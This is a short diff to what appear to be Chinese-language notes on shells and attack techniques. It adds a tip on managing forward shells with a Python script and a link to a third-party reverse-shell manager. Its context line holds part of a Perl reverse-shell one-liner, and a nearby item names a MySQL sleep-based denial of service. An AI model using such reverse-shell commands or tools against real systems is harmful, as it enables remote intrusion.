@@ -324,5 +324,9 @@ perl -e 'use Socket;$i="127.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getproto
 
 5. mysql sleep型dos
 
-6. ....
+6. 所有的正向shell可以自己写一段简单的python脚本进行控制与管理，而反向shell可以使用[王一航写的反向shell管理器](https://github.com/WangYihang/Reverse-Shell-Manager).现在的反向shell管理器还存在一些bug。
+
+7. ....
+
+
 
